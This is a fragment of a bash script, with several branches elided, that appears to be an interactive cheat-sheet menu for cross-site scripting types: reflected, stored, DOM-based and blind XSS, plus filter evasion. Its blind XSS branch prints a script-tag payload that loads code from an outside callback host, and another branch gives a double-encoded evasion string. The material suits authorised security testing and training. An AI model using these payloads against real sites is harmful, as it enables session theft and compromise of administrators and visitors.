...
case $xss_opt in
    1)
        ...
        echo -e "\n${C4}Strategy:${NC} Target URL parameters, headers, or paths reflected in the UI."
        ;;
    2)
        ...
        echo -e "\n${C4}Note:${NC} This is the most dangerous type, infecting all visitors."
        ;;
    3)
        ...
        echo -e "\n${C4}Check:${NC} Use 'DOM Invader' in Burp Suite to trace data flow."
        ;;
    4)
        echo -e "\n${C2}[*] Blind XSS:${NC}"
        echo "Target: Admin panels, CRM tools, or back-end logs."
        echo "Payload: <script src=\"https://your-collaborator-id.oastify.com\"></script>"
        echo -e "\n${C4}Insight:${NC} The payload triggers when an admin views your data in their context."
        ;;
    5)
    ...
    6)
        ...
        echo " - Double encoding: %253cscript%253e"
        ;;
    *) return ;;
esac
